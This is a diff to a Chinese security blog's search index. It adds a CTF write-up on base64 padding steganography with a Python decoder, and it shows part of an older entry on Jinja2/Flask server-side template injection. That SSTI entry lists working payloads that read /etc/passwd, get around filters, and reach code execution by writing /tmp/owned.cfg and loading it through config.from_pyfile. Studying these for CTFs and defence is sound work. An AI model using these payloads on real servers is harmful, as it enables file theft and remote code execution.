@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[RCTF-2015 Decode The File]]></title>
+    <url>%2F2019%2F01%2F19%2FRCTF-2015-Decode-The-File%2F</url>
+    <content type="text"><![CDATA[简介这道题是2015-RCTF的一道密码题，考点有点秀，就记下来了。 题目描述题目给了个cip文件,里面是一行一行的base64加密过的代码，逐行解码之后会得到一个DES加密的python代码。当时我看了很久都没弄懂解码出来的代码有啥用，后来去看了别人的wp才发现还有这种操作。具体就是每行base64加密过的代码解码之后再加密会发现末尾的字母会有变化，而经我测试下来也是如此 其中第一行是原本的明文，第二行是加密之后的base64密文，第三行我将末尾的w改成了y，第四行可以发现我们任然可以解码出原本的明文 而这道题的末尾都经过了这种隐写，最后通过脚本可以直接接出来123456789101112131415161718192021222324252627282930def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('cip', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\n', '') norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print res_strsolve_stego() 总结与其说是crypto不如说是stega，太秀了，而且这种隐写方式也出现在国际赛事上许多次，所以还是记录下来好好学习学习。]]></content>
+      <categories>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Write up</tag>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[SSTI的一些基本操作]]></title>
     <url>%2F2019%2F01%2F17%2FSSTI%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
     <content type="text"><![CDATA[简介记录一下SSTI的一些基本操作，方便以后使用。主要内容转载自该博客 任意文件读取POC123file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。找到file类的索引，在我的环境中&lt;type 'file'&gt;类的索引是40，我们就注入&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;可以通过以下语句绕过一些过滤&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()[40]('/etc/passwd')[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 第一种代码执行POC1234file类不仅去读文件，而且也可以向目标服务器的可写入路径中写文件，然后我们再通过SSTI漏洞第二种代码执行poc调用from_pyfile方法去compile文件并执行其中的内容。这就是一个二次进攻。将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('&lt;malicious code here&gt;') &#125;&#125;注入到SSTI漏洞点，然后在通过注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;调用编译过程。该代码在编译时将会被执行。这就实现了远程代码执行。 第二种代码执行POC：充分地利用from_pyfile方法。123将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') &#125;&#125;注入到SSTI漏洞点，注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;来将新的项目添加到config对象中，将&#123;&#123; config['RUNCMD']('/usr/bin/id',shell=True) &#125;&#125;注入到SSTI漏洞点。]]></content>
